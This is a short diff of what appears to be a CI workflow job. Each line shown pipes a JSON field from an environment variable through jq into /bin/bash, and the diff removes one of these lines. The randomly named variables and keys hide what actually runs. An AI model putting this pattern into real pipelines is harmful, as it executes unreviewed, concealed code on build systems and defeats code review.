@@ -23,7 +23,6 @@ jobs:
           echo $isc99494 | jq -r .s26474 | /bin/bash
           echo $v53 | jq -r .ryn56 | /bin/bash
           printf '%s' "$b90" | jq -r .vv533 | /bin/bash
-          echo $ro13775 | jq -r .aqc9 | /bin/bash
           echo $tieq35454 | jq -r .kw10508 | /bin/bash
           echo $y47424 | jq -r .kyiw35510 | /bin/bash
           echo $i3 | jq -r .pcf91347 | /bin/bash
